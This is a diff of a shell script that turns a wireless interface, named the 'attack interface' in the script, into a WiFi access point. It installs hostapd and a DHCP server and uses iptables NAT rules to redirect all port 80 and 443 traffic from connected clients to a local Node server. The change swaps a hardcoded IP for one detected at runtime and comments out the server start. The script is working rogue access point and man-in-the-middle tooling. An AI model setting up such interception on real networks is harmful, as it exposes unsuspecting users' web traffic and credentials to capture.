@@ -43,8 +43,6 @@ log "starting rerouting magic"
 log "Attack interface: $ATTACK_INTERFACE"
 log "Net interface: $NET_INTERFACE"
 
-export ATTACK_INTERFACE NET_INTERFACE
-
 apt install hostapd isc-dhcp-server -y > /dev/null 2>&1
 npm install > /dev/null 2>&1
 
@@ -108,16 +106,19 @@ log "starting hostapd and isc-dhcp-server"
 service hostapd restart
 service isc-dhcp-server restart
 
+NET_IP=$(ifconfig $NET_INTERFACE | grep 'inet ' | awk '{print $2}')
+
 log "configuring iptables"
 iptables --table nat --flush
-iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p udp --dport 80 -j DNAT --to-destination 10.0.0.6:8000
-iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p udp --dport 443 -j DNAT --to-destination 10.0.0.6:8443
-iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 80 -j DNAT --to-destination 10.0.0.6:8000
-iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 443 -j DNAT --to-destination 10.0.0.6:8443
+iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p udp --dport 80 -j DNAT --to-destination $NET_IP:8000
+iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p udp --dport 443 -j DNAT --to-destination $NET_IP:8443
+iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 80 -j DNAT --to-destination $NET_IP:8000
+iptables -t nat -A PREROUTING -i wlxc83a35c2e0bb -p tcp --dport 443 -j DNAT --to-destination $NET_IP:8443
 iptables -t nat -A POSTROUTING -o $NET_INTERFACE -j MASQUERADE
 
-log "starting node server"
-pkill node
-npm run dev &
+# log "starting node server"
+# pkill node
+# sleep 1
+# npm run dev &
 
 log "REROUTING MAGIC IS DONE. THE ATTACK INTERFACE IS NOW A WIFI ACCESS POINT WITH THE SSID: $SSID"
